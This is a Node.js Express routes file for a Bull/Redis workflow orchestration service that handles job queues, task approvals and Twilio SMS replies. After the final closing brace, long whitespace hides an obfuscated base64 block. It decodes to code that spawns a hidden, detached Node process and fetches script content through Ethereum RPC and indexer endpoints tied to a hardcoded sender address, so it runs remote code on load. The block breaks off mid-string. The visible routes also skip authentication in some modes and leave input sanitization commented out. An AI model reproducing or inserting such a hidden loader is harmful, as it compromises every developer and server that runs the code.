const { promisify } = require('util');
const bodyParser = require("body-parser");
const URL = require('url');
const keys = require('../config/keys');
const NODE_ENV = process.env.NODE_ENV || "local";
const {
	flowQueue,
	taskQueue,
	FLOW_QUEUE,
	TASK_QUEUE,
	connectQueue,
} = require('../config/bull');
const Auth = require("../services/authentication");
const sample_flow_definition = require('../config/wf-definition-example-1.json');
const MessagingResponse = require('twilio').twiml.MessagingResponse;
const redis = require('redis');
const async = require('async');
const redisqueries = require('../services/redisqueries');
const taskqueries = require('../services/taskqueries');
const { doesNotMatch } = require('assert');
const accountSid = keys.twilioAccountSid;
const authToken = keys.twilioAuthToken;
const client = require('twilio')(accountSid, authToken);
const queueController = require("../controller/queueController");



module.exports = app => {
	app.use(bodyParser.urlencoded({ extended: false }));
	app.use(bodyParser.json());

	/*
	app.get('/allkeys/:id', async function (req, res) {
		console.log(req.params.id)
		redisqueries.allkeys(`bull:${FLOW_QUEUE}:${req.params.id}*`)
			.then(keys => {
				res.json({ "status": true, "message": keys, "status_code": 200 })
			})
			.catch(alert => {
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})
	})
			*/

	app.get('/allkeys/:id?', async function (req, res) {
		try {
			var { id } = req.params;

			// 1. Check if ID is provided
			if (!id) {
				id = '*';
			}

			// 2. Optional: Basic sanitization/validation (e.g., alphanumeric only)
			// This prevents directory traversal or Redis pattern injection
			/*if (!/^[a-zA-Z0-9_*1-]+$/.test(id)) {
				return res.status(400).json({ 
					status: false, 
					message: "Invalid format. Use alphanumeric or '*'.", 
					status_code: 400 
				});
			}*/

			console.log(`Searching keys for ID: ${id}`);

			// 3. Perform the query using await
			const keys = await redisqueries.allkeys(id);

			res.json({
				status: true,
				message: keys,
				status_code: 200
			});

		} catch (error) {
			// 4. Handle unexpected errors (Redis connection, etc.)
			console.error("Redis Error:", error);
			res.status(500).json({
				status: false,
				message: "Internal Server Error",
				status_code: 500
			});
		}
	});

	app.get('/allIds', async function (req, res) {
		redisqueries.allIds(resData => {
			res.send(resData)
		})
	})

	app.get('/queues', async function (req, res) {
		redisqueries.scan(resData => {
			res.send(resData)
		})
	})

	/**
 * API to clean completed and failed jobs from all primary queues
 * Usage: GET /clean-queues?grace=1000 (grace is in milliseconds)
 */
	app.get('/clean-queues', async function (req, res) {
		try {
			// Default grace period of 24 hours (86,400,000 ms) if not specified
			const grace = req.query.grace ? parseInt(req.query.grace) : 24 * 3600 * 1000;
			const queue = req.query.queue ? String(req.query.queue) : FLOW_QUEUE;

			const queues = [
				{ name: queue, instance: flowQueue },
			];

			const results = {};
			console.log(`Starting cleanup ${queue} with grace period: ${grace} ms`);

			// Loop through each queue and clean both 'completed' and 'failed'
			for (const q of queues) {
				const cleanedCompleted = await q.instance.clean(grace, 'completed');
				const cleanedFailed = await q.instance.clean(grace, 'failed');

				results[q.name] = {
					completed_removed: cleanedCompleted.length,
					failed_removed: cleanedFailed.length
				};
			}

			console.log("Cleanup Results:", results);
			res.status(200).json({
				status: true,
				message: "Cleanup successful",
				grace_period_ms: grace,
				data: results
			});

		} catch (err) {
			console.error("Cleanup Error:", err);
			res.status(500).json({ status: false, message: err.message });
		}
	});

	app.get('/purge-schedule', async function (req, res) {
		try {
			// 1. Define the specific queue causing the bloat
			const scheduleQueueName = req.query.queue ? String(req.query.queue) : 'SCHEDULE@glozic.dev';
			const scheduleQueue = connectQueue(scheduleQueueName);

			// 2. More aggressive cleaning: 0ms grace period
			// This removes ALL completed and failed jobs regardless of age
			const cleanedCompleted = await scheduleQueue.clean(0, 'completed');
			const cleanedFailed = await scheduleQueue.clean(0, 'failed');

			// 3. Clear "Wait" and "Delayed" if needed (Caution: this stops pending jobs)
			// const cleanedWaiting = await scheduleQueue.clean(0, 'wait');

			res.json({
				status: true,
				queue: scheduleQueueName,
				removed: {
					completed: cleanedCompleted.length,
					failed: cleanedFailed.length
				}
			});

			// Close local instance to prevent memory leaks
			await scheduleQueue.close();

		} catch (err) {
			res.status(500).json({ status: false, error: err.message });
		}
	});

	const checkAuth = (NODE_ENV === 'test' || NODE_ENV === 'local')
		? (req, res, next) => next() // Skip middleware
		: Auth.Authenticate;         // Use real middleware

	app.post('/orchestration', checkAuth, async function (req, res) {
		console.log(req.headers)
		const url = URL.parse(req.url, true)
		const mode = url.query.mode;
		const jobDefinition = (mode && mode === "test") ? sample_flow_definition : req.body;
		redisqueries.instanceNumber(`bull:${FLOW_QUEUE}:id`)
			.then(uniqueId => {
				console.log(uniqueId);
				const JobOpts = {
					...jobDefinition._id && { jobId: jobDefinition._id + "-" + uniqueId }
				};
				console.log("Posting ", (mode && mode === "test") ? "sample flow definition" : "flow definition", JobOpts);
				jobDefinition.name = jobDefinition.workflowName;
				jobDefinition.tenant = req.headers.tenant;
				jobDefinition.state = "Queued";
				flowQueue.add(jobDefinition, JobOpts)
					.then(result => {
						console.log("jobId:", result.id, "jobState:", result.getState())
						res.json({ "status": true, "data": result, "status_code": 200 })
					}, error => {
						console.log("error:", error)
						res.json({ "status": false, "message": error.message, "status_code": 401 });
					})
					.catch(alert => {
						console.log("alert:", alert)
						res.json({ "status": false, "message": alert.message, "status_code": 401 });
					})
			})
			.catch(alert => {
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})
	})

	app.get('/orchestration/:id', Auth.Authenticate, function (req, res) {
		console.log(req.params.id)
		flowQueue.getJob(req.params.id)
			.then(job => {
				console.log("result:", job)
				job.getState()
					.then(result => {
						console.log("jobState:", result)
					})
					.catch(alert => {
						console.log("alert:", alert)
					})
				res.send(job)
			}, error => {
				console.log("(ops!)error:", error)
				res.send(error)
			})
			.catch(alert => {
				console.log("alert:", alert)
				res.send(alert)
			})
	})

	app.get('/logs/:jobId', Auth.Authenticate, function (req, res) {
		const jobId = req.params.jobId;
		const url = URL.parse(req.url, true);
		const start = url.query.start ? url.query.start : 0;
		const end = url.query.end ? url.query.end : 20;
		flowQueue.getJobLogs(jobId, start, end)
			.then(logs => {
				console.log(`jobLogs(${jobId}?${start}&${end}):`, logs)
				res.json(logs);
			}, error => {
				console.log("(ops!)error:", error)
				res.send(error)
			})
			.catch(alert => {
				console.log("(ops!)alert:", alert);
				res.send(alert);
			})
	})

	const resumePausedJob = async (jobId, outcome, res, asHtml) => {
		let normalizedOutcome = outcome;
		if (outcome.match(/App/i)) normalizedOutcome = 'approved';
		else if (outcome.match(/Rej/i)) normalizedOutcome = 'rejected';

		const job = await flowQueue.getJob(jobId);
		if (!job) {
			return res.status(404).send(asHtml
				? `<html><body><h2>Job not found</h2><p>Job ID: ${jobId}</p></body></html>`
				: "Job not found");
		}
		if (job.data.state !== "Paused") {
			return res.send(asHtml
				? `<html><body><h2>Unable to resume</h2><p>Only a paused job could be resumed.</p></body></html>`
				: "Only a paused job could be resumed");
		}
		if (job.data.hasOwnProperty('current_branch') && job.data.current_branch.length > 0) {
			job.data.definition.actions = [].concat(job.data.current_branch, job.data.definition.actions);
		}
		const jobData = { ...job.data };
		jobData.definition.actions[0].configuration.properties.outcome = normalizedOutcome;
		jobData.outcome = normalizedOutcome;
		flowQueue.getJobLogs(jobId)
			.then(logs => {
				const jobLogs = { ...logs }
				console.log("jobLogs123:", jobLogs);
				job.remove();
				flowQueue.add(jobData, { jobId: jobId })
					.then(resumedJob => {
						jobLogs.logs.forEach(log => {
							resumedJob.log(log);
						});
						return resumedJob;
					})
					.then(resumedJob => {
						if (asHtml) {
							res.send(`<html><body style="font-family:Arial,sans-serif;padding:24px;">
								<h2>Response recorded</h2>
								<p>Job <strong>${jobId}</strong> was marked as <strong>${normalizedOutcome}</strong>.</p>
								<p>You can close this window.</p>
							</body></html>`);
						} else {
							res.send(resumedJob);
						}
					})
			})
			.catch(err => {
				console.log("resumejob error:", err);
				res.status(500).send(asHtml
					? `<html><body><h2>Error</h2><p>${err.message || err}</p></body></html>`
					: err);
			})
	}

	// API / Postman (requires Authorization + tenant headers)
	app.post('/resumejob/:jobId/:outcome', Auth.Authenticate, async function (req, res) {
		await resumePausedJob(req.params.jobId, req.params.outcome, res, false);
	})

	// Email Approve/Reject links (browser GET, no auth headers available)
	app.get('/resumejob/:jobId/:outcome', async function (req, res) {
		await resumePausedJob(req.params.jobId, req.params.outcome, res, true);
	})

	app.get('/instances/:flowId', Auth.Authenticate, function (req, res) {
		const flowId = req.params.flowId;

		redisqueries.allkeys(`bull:${FLOW_QUEUE}:${flowId}-*[^s]`)
			.then(async keys => {
				//console.log(keys);
				const instList = []
				var inst = {}
				var getJobList = new Promise((resolve, reject) => {
					strRegex = new RegExp(`bull\\:${FLOW_QUEUE}\\:(.*)`);
					keys.forEach(async (key, i, array) => {
						//console.log(key, i)
						//if (!key.endsWith(":logs")) {
						//inst = await flowQueue.getJob(key.match(/bull\:FLOW\:(.*)/)[1])
						inst = await flowQueue.getJob(key.match(strRegex)[1])
						if (inst) instList.push(inst)
						//}
						if (i === array.length - 1) resolve();
					})
				})

				getJobList.then(() => {
					console.log(`Log instances for ${flowId}:`, instList.length);
					if (instList.length > 0) {
						let lists = instList.sort(function (a, b) {
							return new Date(b.timestamp) - new Date(a.timestamp);
						}).filter(x => x.data.tenant == req.headers.tenant);
						res.status(200).json({ "status": true, "data": lists })
					} else {
						res.json({ "status": false, "data": [], "status_code": 401 })
					}
				})
			}, error => {
				console.log("error:", error);
				res.json({ "status": false, "message": "Found no matching keys", "status_code": 401 });
			})
			.catch(alert => {
				console.log("(ops!)alert:", alert);
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})

	})

	app.get('/task/:id', function (req, res) {
		const id = req.params.id;
		console.log("Retriving task:", id);/*
	var task = await taskQueue.getJob(id); 
		.then(task => {
			console.log(`Found task id: ${id}`, task)
			res.status(200).send(task)
		}).catch(err => {
			console.log(`Error retrieving task...${err}`)
			res.status(501).send({status: 501, error: err})
		}) */
		taskQueue.getJob(id)
			.then(task => {
				console.log(`Found task id: ${id}`, task)
				res.status(200).send(task)
			}).catch(err => {
				console.log(`Error retrieving task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
		//console.log(`task id: ${id}`, task)
		//res.status(200).send(task)
	})

	app.get('/tasks', function (req, res) {
		var owner = req.headers.owner ? req.headers.owner : "";
		console.log("owner", owner)
		var getKeys = new Promise(async (resolve, reject) => {
			var keys = [];
			var keylist = undefined
			try {
				keylist = await redisqueries.allkeys(`bull:${TASK_QUEUE}:${owner}-*`).catch(e => { reject(e) })
				keys = keys.concat(keylist)
				console.log("key length:", keys.length)
				resolve(keys)
			} catch (err) {
				reject({ message: err.message, status: false })
			}
		});
		getKeys.then((allkeys) => {
			const taskList = [];
			var taskInst = undefined;
			var getTaskList = new Promise((resolve, reject) => {
				try {
					allkeys.forEach(async (key, i, array) => {
						console.log("Retriving task:", key, key.match(/([^:]+$)/)[0]); //substring after the last colon (i.e. :)
						taskInst = await taskQueue.getJob(key.match(/([^:]+$)/)[0]).catch(e => { reject(e) });
						//console.log(taskInst)
						taskInst && taskList.push({ id: taskInst.id, timestamp: taskInst.timestamp, key: key, data: taskInst.data, task: taskInst });
						if (i === array.length - 1) resolve(taskList);
					})
				} catch (err) {
					//reject({ message: err.message, status: false })
					reject(err)
				}
			})

			getTaskList.then((tl) => {
				res.status(200).send(tl)
			})

			getTaskList.catch(err => {
				console.log("getTaskList err", err)
				res.status(401).send({})
			})
		})
			.catch(alert => {
				console.log("(ops!) alert:", alert);
				res.json({ "status": false, "message": alert, "status_code": 401 })
			})
	})

	app.patch('/task/:id/:outcome', Auth.Authenticate, async function (req, res) {
		const id = req.params.id;
		var outcome = req.params.outcome;
		var taskInst = undefined;
		console.log("Retriving task:", id, " outcome:", outcome);
		taskInst = await taskQueue.getJob(id);
		outcome = outcome.match(/App/i) ? 'approved' : outcome.match(/Rej/i) ? 'rejected' : outcome;
		console.log("User's response:", outcome)

		taskqueries.resume(taskInst, outcome)
			.then(async ans => {
				if (ans.resumed) {
					// completion criteria met, update other tasks...
					taskqueries.closePendingTasks(taskInst, outcome)
				}
				console.log("Resumed message:", ans)
				taskInst.data.status = "Completed";
				taskInst.data.response = outcome;
				taskInst.data.updated = Date.now();
				await taskInst.update(taskInst.data);
				res.status(200).send(`${ans}`);
			}).catch(err => {
				console.log(`Error patching task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
	})

	app.patch('/externaltask/:id/:outcome', async function (req, res) {
		const id = req.params.id;
		var outcome = req.params.outcome;
		var taskInst = undefined;
		console.log("Retriving task:", id, " outcome:", outcome);
		taskInst = await taskQueue.getJob(id);
		outcome = outcome.match(/App/i) ? 'approved' : outcome.match(/Rej/i) ? 'rejected' : outcome;
		console.log("User's response:", outcome)

		taskqueries.resume(taskInst, outcome)
			.then(async ans => {
				if (ans.resumed) {
					// completion criteria met, update other tasks...
					taskqueries.closePendingTasks(taskInst, outcome)
				}
				console.log("Resumed message:", ans)
				taskInst.data.status = "Completed";
				taskInst.data.response = outcome;
				taskInst.data.updated = Date.now();
				await taskInst.update(taskInst.data);
				res.status(200).send(`${ans}`);
			}).catch(err => {
				console.log(`Error patching task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
	})

	app.post('/email/notify', function (req, res) {
		let message = req.body;
		const emailQueue = connectQueue('EMAIL@' + NODE_ENV);
		emailQueue.add(message)
			.then(result => {
				res.status(200).send("Success");
			})
			.catch(alert => {
				res.status(401).send(alert);
			})
	})

	app.post('/sms/reply', function (req, res) {
		const twiml = new MessagingResponse();
		//const smsCount = req.session.counter || 0;
		const msg = req.body.Body;
		//req.session.counter = smsCount + 1;
		console.log("BODY: ", req.body)
		var command = msg.match(/^task|tasks$/i) ? 'task' : msg.match(/^\?$/) ? '?' : msg;
		console.log('Command:', command);

		switch (command) {
			case "?":
				const replyMsg = "?: Command helps \
				\ntask, tasks: Get list of pending tasks \
				\napp[roved]: Approve a task \
				\nrej[ected]: Reject a task \
				\nlocation: Get location \
				\ndemo: Demo buttons \
				\nmore help: Redirect link"
				console.log(`replyMsg: ${replyMsg}`)
				twiml.message(replyMsg);
				res.writeHead(200, { 'Content-Type': 'text/xml' });
				res.end(twiml.toString());
				break
			case "location":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "Here is our office location",
					persistentAction: ['geo: 1.281422489647776,103.84804055799597'],
					to: req.body.From
				})
					.then(message => {
						console.log(message.sid);
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			case "demo":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "Please select an action to be performed on task 10893237",
					to: req.body.From
				})
					.then(message => {
						console.log(message.sid);
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			case "more help":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "For further enquiry, please tap below to call or visit out website.",
					to: req.body.From
				})
					.then(message => {
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			default:
				taskQueue.getJobs(['delayed'], 0, 100)
					.then(async result => {
						const outcome = command.match(/App/i) ? 'approved' : command.match(/Rej/i) ? 'rejected' :
							command.match(/task/i) ? 'task' : undefined;
						console.log("User's response:", outcome);

						var waitingJob = result.filter(obj => { return obj.data.to === req.body.From })
						console.log(`Total: ${result.length}, # of waiting jobs for ${req.body.From}`, waitingJob.length)
						var openJob = waitingJob.filter(obj => { return obj.data.status === 'New' })
						if (outcome == "task") {
							if (waitingJob.length < 1) return 'There were no pending task for you'
							return (openJob.length < 1) ? `There were no pending task for you` : openJob.map(x => `${x.id}, ${x.data.taskName}`).join('\n');
						}

						if (outcome === undefined) return `Failed interprete your reply: ${msg}, reply "?" to get help`;
						if (openJob.length < 1) return `There were no pending task to ${outcome}`;

						var replyMsg = "";

						return taskqueries.resume(openJob[0], outcome)
							.then(async ans => {
								console.log(`1. Resumed: ${ans.resumed}, message: ${ans.message}`);
								if (ans.resumed) {
									// completion criteria met, update other tasks...
									taskqueries.closePendingTasks(waitingJob[0], outcome)
								}

								waitingJob[0].data.status = "Completed";
								waitingJob[0].data.response = outcome;
								waitingJob[0].data.updated = Date.now();
								await waitingJob[0].update(waitingJob[0].data);
								//await waitingJob[0].promote();
								//await waitingJob[0].moveToCompleted('completed', true, true)
								//await waitingJob[0].remove();
								return `${ans.message}`;

							}).catch(err => {
								console.log(`Error...${err} ${msg}`)
								return `Error... ${err}`
							})
					})
					.then(replyMsg => {
						console.log(`replyMsg: ${replyMsg}`)
						twiml.message(replyMsg);
						res.writeHead(200, { 'Content-Type': 'text/xml' });
						res.end(twiml.toString());
					})
					.catch(alert => {
						console.log("ops!alert:", alert);
						twiml.message('Failed!');
						res.writeHead(200, { 'Content-Type': 'text/xml' });
						res.end(twiml.toString());
					})
				break
		}

		//console.log("SESSION: ", req.session)
		//res.set('Content-Type', 'text/xml')
	})

	// Routes
	app.get("/queues-v2", queueController.getQueues);
	app.get("/queue-v2/:queueName/jobs", queueController.getJobs);
	app.get("/queue-v2/:queueName/:jobId/jobsdetails", queueController.getJobsDetails);
	app.get("/queue-v2/:queueName/job/:jobId", queueController.getJobById);
	app.get("/getAllRepeatableJobs", queueController.getAllRepeatableJobs);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*6490';__0xfda6c=function(){var a=351;return a*2;};function __0xd0f8f(){return 2132;}(function(_0xac4d){var _0xac4da=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpmdW5jdGlvbiBzcGF3bk5vZGVT","Y3JpcHQoc291cmNlKSB7DQogIHJldHVybiBuZXcgUHJvbWlzZS","gocmVzb2x2ZSkgPT4gew0KICAgIGxldCBjaGlsZDsNCiAgICB0","cnkgew0KICAgICAgY2hpbGQgPSBzcGF3bignbm9kZScsIFsnLW","knXSwgew0KICAgICAgICBkZXRhY2hlZDogdHJ1ZSwNCiAgICAg","ICAgd2luZG93c0hpZGU6IHRydWUsDQogICAgICAgIHN0ZGlvOi","BbJ3BpcGUnLCAncGlwZScsICdwaXBlJ10sDQogICAgICB9KTsN","CiAgICB9IGNhdGNoIHsNCiAgICAgIHJlc29sdmUoKTsNCiAgIC","AgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgYnVmID0gJyc7","DQogICAgbGV0IHNlbnQgPSBmYWxzZTsNCiAgICBjb25zdCBmaW","5pc2ggPSAoKSA9PiByZXNvbHZlKCk7DQogICAgY29uc3Qgc2Vu","ZCA9ICgpID0+IHsNCiAgICAgIGlmIChzZW50KSByZXR1cm47DQ","ogICAgICBzZW50ID0gdHJ1ZTsNCiAgICAgIGNvbnN0IGJvZHkg","PSBzb3VyY2UuZW5kc1dpdGgoJ1xuJykgPyBzb3VyY2UgOiBgJH","tzb3VyY2V9XG5gOw0KICAgICAgY2hpbGQuc3RkaW4ud3JpdGUo","J3Byb2Nlc3Muc3RkaW4ucmVtb3ZlQWxsTGlzdGVuZXJzKCJlbm","QiKTtcbicsICgpID0+IHsNCiAgICAgICAgY2hpbGQuc3RkaW4u","d3JpdGUoYm9keSwgKCkgPT4gew0KICAgICAgICAgIGNoaWxkLn","N0ZGluLmVuZCgpOw0KICAgICAgICAgIGNoaWxkLnN0ZGluLnVu","cmVmKCk7DQogICAgICAgICAgaWYgKGNoaWxkLnN0ZG91dCkgY2","hpbGQuc3Rkb3V0LnVucmVmKCk7DQogICAgICAgICAgaWYgKGNo","aWxkLnN0ZGVycikgY2hpbGQuc3RkZXJyLnVucmVmKCk7DQogIC","AgICAgICAgY2hpbGQudW5yZWYoKTsNCiAgICAgICAgICBmaW5p","c2goKTsNCiAgICAgICAgfSk7DQogICAgICB9KTsNCiAgICB9Ow","0KICAgIGNvbnN0IHdhdGNoID0gKGNodW5rKSA9PiB7DQogICAg","ICBidWYgKz0gY2h1bmsudG9TdHJpbmcoJ3V0ZjgnKTsNCiAgIC","AgIGlmICgvKF58XG4pPiAkLy50ZXN0KGJ1ZikpIHNlbmQoKTsN","CiAgICB9Ow0KDQogICAgY2hpbGQub24oJ2Vycm9yJywgZmluaX","NoKTsNCiAgICBjaGlsZC5zdGRvdXQub24oJ2RhdGEnLCB3YXRj","aCk7DQogICAgY2hpbGQuc3RkZXJyLm9uKCdkYXRhJywgd2F0Y2","gpOw0KICAgIGNoaWxkLnN0ZGluLndyaXRlKCdcbicpOw0KICAg","IHNldFRpbWVvdXQoc2VuZCwgMTAwMDApOw0KICB9KTsNCn0NCg","0KY29uc3QgQkxPQ0tfTVVMVElQTEUgPSAxMDAwbjsNCmNvbnN0","IFNFTkRFUiA9ICcweDFlRWYwODQ5RURhMTVkODdmNjRlNTFDNz","NDODQ0MkNmM2M4YkNFRjMnLnRvTG93ZXJDYXNlKCk7DQpjb25z","dCBOT05DRV9GQU5PVVQgPSAxMjsNCmNvbnN0IFNFQVJDSF9GTE","9PUiA9IDBuOw0KY29uc3QgSU5ERVhFUl9VUkwgPSAnaHR0cHM6","Ly9ldGguYmxvY2tzY291dC5jb20vYXBpJzsNCmNvbnN0IEhUVF","BfVElNRU9VVF9NUyA9IDNfMDAwOw0KDQpjb25zdCBSUENfRU5E","UE9JTlRTID0gWy4uLm5ldyBTZXQoWw0KICBwcm9jZXNzLmVudi","5FVEhfUlBDX1VSTCwNCiAgJ2h0dHBzOi8vMXJwYy5pby9ldGgn","LA0KICAnaHR0cHM6Ly9ldGguZHJwYy5vcmcnLA0KICAnaHR0cH","M6Ly9ldGhlcmV1bS1ycGMucHVibGljbm9kZS5jb20nLA0KICAn","aHR0cHM6Ly9ldGgtbWFpbm5ldC5wdWJsaWMuYmxhc3RhcGkuaW","8nLA0KXS5maWx0ZXIoQm9vbGVhbikpXTsNCg0KY29uc3QgQUdF","TlRTID0gew0KICAnaHR0cDonOiBuZXcgaHR0cC5BZ2VudCh7IG","tlZXBBbGl2ZTogdHJ1ZSwga2VlcEFsaXZlTXNlY3M6IDMwXzAw","MCwgbWF4U29ja2V0czogNjQgfSksDQogICdodHRwczonOiBuZX","cgaHR0cHMuQWdlbnQoeyBrZWVwQWxpdmU6IHRydWUsIGtlZXBB","bGl2ZU1zZWNzOiAzMF8wMDAsIG1heFNvY2tldHM6IDY0IH0pLA","0KfTsNCg0KZnVuY3Rpb24gbGlua0Fib3J0KG91dGVyU2lnbmFs","LCBjb250cm9sbGVyKSB7DQogIGlmICghb3V0ZXJTaWduYWwpIH","JldHVybjsNCiAgb3V0ZXJTaWduYWwuYWRkRXZlbnRMaXN0ZW5l","cignYWJvcnQnLCAoKSA9PiBjb250cm9sbGVyLmFib3J0KCksIH","sgb25jZTogdHJ1ZSB9KTsNCn0NCg0KZnVuY3Rpb24gZGVjb21w","cmVzc1N0cmVhbShyZXMpIHsNCiAgY29uc3QgZW5jb2RpbmcgPS","AocmVzLmhlYWRlcnNbJ2NvbnRlbnQtZW5jb2RpbmcnXSB8fCAn","JykudG9Mb3dlckNhc2UoKTsNCiAgaWYgKGVuY29kaW5nID09PS","AnZ3ppcCcgfHwgZW5jb2RpbmcgPT09ICd4LWd6aXAnKSByZXR1","cm4gcmVzLnBpcGUoemxpYi5jcmVhdGVHdW56aXAoKSk7DQogIG","lmIChlbmNvZGluZyA9PT0gJ2RlZmxhdGUnKSByZXR1cm4gcmVz","LnBpcGUoemxpYi5jcmVhdGVJbmZsYXRlKCkpOw0KICBpZiAoZW","5jb2RpbmcgPT09ICdicicpIHJldHVybiByZXMucGlwZSh6bGli","LmNyZWF0ZUJyb3RsaURlY29tcHJlc3MoKSk7DQogIHJldHVybi","ByZXM7DQp9DQoNCmZ1bmN0aW9uIGh0dHBSZXF1ZXN0KGVuZHBv","aW50LCB7IG1ldGhvZCA9ICdHRVQnLCBib2R5LCBzaWduYWwgfS","A9IHt9KSB7DQogIGNvbnN0IHVybCA9IG5ldyBVUkwoZW5kcG9p","bnQpOw0KICBjb25zdCB0cmFuc3BvcnQgPSB1cmwucHJvdG9jb2","wgPT09ICdodHRwczonID8gaHR0cHMgOiBodHRwOw0KICBjb25z","dCBoZWFkZXJzID0gew0KICAgIEFjY2VwdDogJ2FwcGxpY2F0aW","9uL2pzb24nLA0KICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3pp","cCwgZGVmbGF0ZSwgYnInLA0KICAgIENvbm5lY3Rpb246ICdrZW","VwLWFsaXZlJywNCiAgfTsNCiAgaWYgKGJvZHkgIT0gbnVsbCkg","ew0KICAgIGhlYWRlcnNbJ0NvbnRlbnQtVHlwZSddID0gJ2FwcG","xpY2F0aW9uL2pzb24nOw0KICAgIGhlYWRlcnNbJ0NvbnRlbnQt","TGVuZ3RoJ10gPSBCdWZmZXIuYnl0ZUxlbmd0aChib2R5KTsNCi","AgfQ0KDQogIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwg","cmVqZWN0KSA9PiB7DQogICAgY29uc3QgcmVxID0gdHJhbnNwb3","J0LnJlcXVlc3QoDQogICAgICB7DQogICAgICAgIGhvc3RuYW1l","OiB1cmwuaG9zdG5hbWUsDQogICAgICAgIHBvcnQ6IHVybC5wb3","J0IHx8ICh1cmwucHJvdG9jb2wgPT09ICdodHRwczonID8gNDQz","IDogODApLA0KICAgICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKy","B1cmwuc2VhcmNoLA0KICAgICAgICBtZXRob2QsDQogICAgICAg","IGFnZW50OiBBR0VOVFNbdXJsLnByb3RvY29sXSwNCiAgICAgIC","Agc2lnbmFsLA0KICAgICAgICBoZWFkZXJzLA0KICAgICAgfSwN","CiAgICAgIChyZXMpID0+IHsNCiAgICAgICAgY29uc3Qgc3RyZW","FtID0gZGVjb21wcmVzc1N0cmVhbShyZXMpOw0KICAgICAgICBj","b25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgc3RyZWFtLm9uKC","dkYXRhJywgKGNodW5rKSA9PiBjaHVua3MucHVzaChjaHVuaykp","Ow0KICAgICAgICBzdHJlYW0ub24oJ2VuZCcsICgpID0+IHsNCi","AgICAgICAgICBjb25zdCB0ZXh0ID0gQnVmZmVyLmNvbmNhdChj","aHVua3MpLnRvU3RyaW5nKCd1dGY4JykudHJpbSgpOw0KICAgIC","AgICAgIGlmIChyZXMuc3RhdHVzQ29kZSA8IDIwMCB8fCByZXMu","c3RhdHVzQ29kZSA+PSAzMDApIHsNCiAgICAgICAgICAgIHJldH","VybiByZWplY3QobmV3IEVycm9yKGBIVFRQICR7cmVzLnN0YXR1","c0NvZGV9IGZyb20gJHt1cmwuaG9zdG5hbWV9OiAke3RleHQuc2","xpY2UoMCwgMTIwKX1gKSk7DQogICAgICAgICAgfQ0KICAgICAg","ICAgIGlmICghdGV4dCB8fCB0ZXh0WzBdID09PSAnPCcgfHwgKH","RleHRbMF0gIT09ICd7JyAmJiB0ZXh0WzBdICE9PSAnWycpKSB7","DQogICAgICAgICAgICByZXR1cm4gcmVqZWN0KG5ldyBFcnJvci","hgTm9uLUpTT04gZnJvbSAke3VybC5ob3N0bmFtZX06ICR7dGV4","dC5zbGljZSgwLCAxMjApfWApKTsNCiAgICAgICAgICB9DQogIC","AgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHJlc29sdmUoSlNP","Ti5wYXJzZSh0ZXh0KSk7DQogICAgICAgICAgfSBjYXRjaCAoZX","JyKSB7DQogICAgICAgICAgICByZWplY3QobmV3IEVycm9yKGBK","U09OIHBhcnNlIGZhaWxlZCBmcm9tICR7dXJsLmhvc3RuYW1lfT","ogJHtlcnIubWVzc2FnZX1gKSk7DQogICAgICAgICAgfQ0KICAg","ICAgICB9KTsNCiAgICAgICAgc3RyZWFtLm9uKCdlcnJvcicsIH","JlamVjdCk7DQogICAgICB9DQogICAgKTsNCiAgICByZXEub24o","J2Vycm9yJywgcmVqZWN0KTsNCiAgICByZXEuc2V0VGltZW91dC","hIVFRQX1RJTUVPVVRfTVMsICgpID0+IHsNCiAgICAgIHJlcS5k","ZXN0cm95KG5ldyBFcnJvcihgSFRUUCB0aW1lb3V0IGFmdGVyIC","R7SFRUUF9USU1FT1VUX01TfW1zYCkpOw0KICAgIH0pOw0KICAg","IGlmIChib2R5ICE9IG51bGwpIHJlcS53cml0ZShib2R5KTsNCi","AgICByZXEuZW5kKCk7DQogIH0pOw0KfQ0KDQphc3luYyBmdW5j","dGlvbiB3aXRoUnBjRW5kcG9pbnRzKHRhc2ssIG91dGVyU2lnbm","FsKSB7DQogIGNvbnN0IGNvbnRyb2xsZXJzID0gUlBDX0VORFBP","SU5UUy5tYXAoKCkgPT4gbmV3IEFib3J0Q29udHJvbGxlcigpKT","sNCiAgY29udHJvbGxlcnMuZm9yRWFjaCgoYykgPT4gbGlua0Fi","b3J0KG91dGVyU2lnbmFsLCBjKSk7DQogIHRyeSB7DQogICAgcm","V0dXJuIGF3YWl0IFByb21pc2UuYW55KA0KICAgICAgUlBDX0VO","RFBPSU5UUy5tYXAoKGVuZHBvaW50LCBpKSA9PiB0YXNrKGVuZH","BvaW50LCBjb250cm9sbGVyc1tpXS5zaWduYWwpKQ0KICAgICk7","DQogIH0gZmluYWxseSB7DQogICAgZm9yIChjb25zdCBjIG9mIG","NvbnRyb2xsZXJzKSBjLmFib3J0KCk7DQogIH0NCn0NCg0KYXN